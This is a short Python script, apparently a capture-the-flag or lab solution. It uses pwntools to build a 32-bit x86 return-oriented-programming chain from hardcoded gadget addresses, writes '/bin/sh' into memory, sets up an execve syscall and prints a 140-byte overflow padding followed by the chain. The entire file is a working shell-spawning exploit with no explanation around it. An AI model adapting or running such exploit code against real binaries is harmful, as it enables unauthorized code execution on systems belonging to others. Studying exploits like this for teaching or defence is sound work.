from pwn import p32, u32

# 0x080481ec : pop ebx ; ret
# 0x080c28c6 : pop eax ; ret
# 0x080e3c2a : pop ecx ; ret
# 0x080551ca : pop edx ; ret
# 0x0808ee3d : mov dword ptr [edx], eax ; ret
# 0x08049449 : int 0x80

def set_ebx(value):
    return p32(0x080481ec)\
        + p32(value)

def set_eax(value):
    return p32(0x080c28c6)\
        + p32(value)

def set_ecx(value):
    return p32(0x080e3c2a)\
        + p32(value)

def set_edx(value):
    return p32(0x080551ca)\
        + p32(value)

def set_mem(addr, value):
    return set_edx(addr)\
        + set_eax(value)\
        + p32(0x0808ee3d)

def syscall():
    return p32(0x08049449)

if __name__ == '__main__':
    writable_mem = 0x80ee500
    ropchain = set_mem(writable_mem, u32('/bin'))\
        + set_mem(writable_mem+4, u32('/sh\x00'))\
        + set_eax(0x0b)\
        + set_ebx(writable_mem)\
        + set_ecx(0)\
        + set_edx(0)\
        + syscall()

    payload = 140*'A' + ropchain

    print payload